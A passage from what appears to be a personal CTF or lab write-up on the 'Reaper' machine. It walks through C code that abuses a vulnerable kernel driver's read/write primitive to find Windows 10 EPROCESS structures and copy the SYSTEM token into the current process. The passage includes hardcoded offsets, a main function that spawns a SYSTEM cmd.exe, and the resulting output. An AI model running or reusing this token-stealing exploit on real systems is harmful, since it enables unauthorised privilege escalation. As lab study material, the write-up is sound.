<span class="w">            </span><span class="n">cTokenPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x208</span><span class="p">);</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cPid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">currentProcessPid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">cProcess</span><span class="p">,</span><span class="w"> </span><span class="n">cPid</span><span class="p">,</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">);</span>
<span class="w">                </span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">"Could not find current process in ActiveProcessLinks</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">            </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">eProcResult</span><span class="w"> </span><span class="n">result</span><span class="p">{};</span>
<span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="n">eProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cProcess</span><span class="p">;</span>
<span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="n">tokenPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">;</span>
<span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cPid</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>
<p>However there are a number of things that need adjustment.  For example it should be able to take an arbitrary process ID.  The <code>EPROCESS</code> offsets specified in the function are in relation to <code>Windows 7 x64</code>, but this is <code>Windows 10 Pro x64</code>,  so is the real <code>REAPER</code> target machine, and the first document makes mention that the offsets are dependent on the version of windows as the structure keeps changing with each new version.</p>
<p>And for the offsets, <code>EPROCESS</code> under <code>Windows 10 Pro x64</code>:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109012409.png" data-desc-position="bottom"><img alt="Pasted_image_20251109012409.png" src="../../../../Pasted_image_20251109012409.png"></a></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109012511.png" data-desc-position="bottom"><img alt="Pasted_image_20251109012511.png" src="../../../../Pasted_image_20251109012511.png"></a></p>
<p>Here is what I finally settled on:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#define EPROCESS_UniqueProcessId        0x440</span>
<span class="cp">#define EPROCESS_ActiveProcessLinks     0x448</span>
<span class="cp">#define EPROCESS_Token                  0x4b8</span>

<span class="n">eProcResult</span><span class="w"> </span><span class="nf">GetCurrentEProcessByPid</span><span class="p">(</span><span class="n">DWORD</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// find system EPROCESS &amp; token     </span>
<span class="w">    </span><span class="n">QWORD</span><span class="w"> </span><span class="n">systemProc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getSystemEProcess</span><span class="p">();</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] System _EPROCESS: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">systemProc</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// walk ActiveProcessLinks to find our process</span>
<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">QWORD</span><span class="w"> </span><span class="n">cProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">systemProc</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">cPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">QWORD</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">;</span>

<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">cProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Action</span><span class="p">(</span><span class="n">OP_LOCAL</span><span class="p">,</span><span class="w"> </span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EPROCESS_ActiveProcessLinks</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0</span><span class="p">);</span><span class="w"> </span><span class="c1">// get next entry in ActiveProcessLinks (dt _EPROCESS)        </span>
<span class="w">        </span><span class="n">cProcess</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">EPROCESS_ActiveProcessLinks</span><span class="p">;</span><span class="w"> </span><span class="c1">// get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)</span>
<span class="w">        </span><span class="n">cPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Action</span><span class="p">(</span><span class="n">OP_LOCAL</span><span class="p">,</span><span class="w"> </span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EPROCESS_UniqueProcessId</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0</span><span class="p">);</span>
<span class="w">        </span><span class="n">cTokenPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Action</span><span class="p">(</span><span class="n">OP_LOCAL</span><span class="p">,</span><span class="w"> </span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EPROCESS_Token</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cPid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] Process: %llx (PID: %d, TOKEN_PTR: %llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">cProcess</span><span class="p">,</span><span class="w"> </span><span class="n">cPid</span><span class="p">,</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">);</span>
<span class="w">            </span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Could not find current process in ActiveProcessLinks</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">eProcResult</span><span class="w"> </span><span class="n">result</span><span class="p">{};</span>
<span class="w">    </span><span class="n">result</span><span class="p">.</span><span class="n">eProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cProcess</span><span class="p">;</span>
<span class="w">    </span><span class="n">result</span><span class="p">.</span><span class="n">tokenPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">;</span>
<span class="w">    </span><span class="n">result</span><span class="p">.</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cPid</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>The while loop loops over <code>ActiveProcessLinks</code> field, like a cursor.  The initial starting point is the system process.  The enclosed IF statement checks the <code>pid</code> passed in at invocation against the cursored <code>cPid</code>.</p>
<p>The only caveat here is that it requires <code>getSystemEProcess()</code>, which itself requires a few structs and enums, other definitions, all of which I had to go hunting for throughout the repo. </p>
<p>Definitions:
 * SystemHandleInformation
 * SystemHandleInformationSize
Type definitions:
 * eProcResult
 * fNtQuerySystemInformation
 * _SYSTEM_HANDLE_TABLE_ENTRY_INFO
 * _SYSTEM_HANDLE_INFORMATION</p>
<p>And then finally, a <code>main</code> function that does the walking and writing.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">reap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReaperSysHandle</span><span class="p">();</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"I am reapthereaper</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">    </span><span class="n">eProcResult</span><span class="w"> </span><span class="n">systemProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCurrentEProcessByPid</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="w">    </span><span class="n">eProcResult</span><span class="w"> </span><span class="n">currentProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCurrentEProcessByPid</span><span class="p">(</span><span class="n">GetCurrentProcessId</span><span class="p">());</span>

<span class="w">    </span><span class="n">Action</span><span class="p">(</span><span class="n">OP_REMOTE</span><span class="p">,</span><span class="w"> </span><span class="n">systemProcess</span><span class="p">.</span><span class="n">eProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EPROCESS_Token</span><span class="p">,</span><span class="w"> </span><span class="n">currentProcess</span><span class="p">.</span><span class="n">eProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EPROCESS_Token</span><span class="p">);</span>
<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">reap</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">reap</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>Other notable mentions:
1. statically-compiled release x64: Project &gt; (binary) properties &gt; Configuration Properties &gt; C/C++ &gt; Code Generation &gt;  Runtime Library == "Multithreaded (/MT)"
2. Auto-copy to Virtualbox shared drive:  Project &gt; (binary) properties &gt; Configuration Properties &gt; Custom Build Step &gt; Command Line  == <code>copy C:\Users\Admin\Desktop\EXCLUSION_ZONE_WHITELISTED\reapthereaper\x64\Release\reapthereaper.exe z:\</code></p>
<h3 id="getting-the-shell_1">Getting the shell<a class="headerlink" href="#getting-the-shell_1" title="Permanent link">¶</a></h3>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109021310.png" data-desc-position="bottom"><img alt="Pasted_image_20251109021310.png" src="../../../../Pasted_image_20251109021310.png"></a></p>
<p>Upon exit:</p>
<div class="highlight"><pre><span></span><code>C:<span class="se">\u</span>sers<span class="se">\k</span>eysvc&gt;exit
<span class="nb">exit</span>
<span class="o">[</span>handle<span class="o">]</span><span class="w"> </span>Good<span class="w"> </span>handle<span class="w"> </span><span class="k">for</span><span class="w"> </span>device<span class="w"> </span><span class="se">\\</span>.<span class="se">\R</span>eaper:<span class="w"> </span>0x0
I<span class="w"> </span>am<span class="w"> </span>reapthereaper
<span class="o">[</span>&gt;<span class="o">]</span><span class="w"> </span>System<span class="w"> </span>_EPROCESS:<span class="w"> </span>0xffff9101cae8d040
<span class="o">[</span>&gt;<span class="o">]</span><span class="w"> </span>Process:<span class="w"> </span>ffff9101cae8d040<span class="w"> </span><span class="o">(</span>PID:<span class="w"> </span><span class="m">4</span>,<span class="w"> </span>TOKEN_PTR:<span class="w"> </span>ffff800aa2a0f045<span class="o">)</span>
<span class="o">[</span>&gt;<span class="o">]</span><span class="w"> </span>System<span class="w"> </span>_EPROCESS:<span class="w"> </span>0xffff9101cae8d040
<span class="o">[</span>&gt;<span class="o">]</span><span class="w"> </span>Process:<span class="w"> </span>ffff9101d1220080<span class="w"> </span><span class="o">(</span>PID:<span class="w"> </span><span class="m">2492</span>,<span class="w"> </span>TOKEN_PTR:<span class="w"> </span>ffff800aac4f2735<span class="o">)</span>
</code></pre></div>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109021631.png" data-desc-position="bottom"><img alt="Pasted_image_20251109021631.png" src="../../../../Pasted_image_20251109021631.png"></a></p>
<p>Scythes out for Reaper</p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 9, 2025 20:27:21 UTC">November 9, 2025</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Created">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 9, 2025 20:27:06 UTC">November 9, 2025</span>
  </span>

    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/SYANiDE-" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/chasejhatch/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://discord.com/users/298244420195844096" target="_blank" rel="noopener" title="discord.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"></path></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "toc.follow", "toc.integrate", "navigation.top", "header.autohide", "search.highlight", "search.share"], "search": "../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
        <script src="../../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
        <script src="../../../../javascripts/app.js"></script>
      
        <script src="../../../../js/asciinema-player.min.js"></script>
      
        <script src="../../../../assets/javascripts/panzoom.min.js"></script>
      
        <script src="../../../../assets/javascripts/zoompan.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": false, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>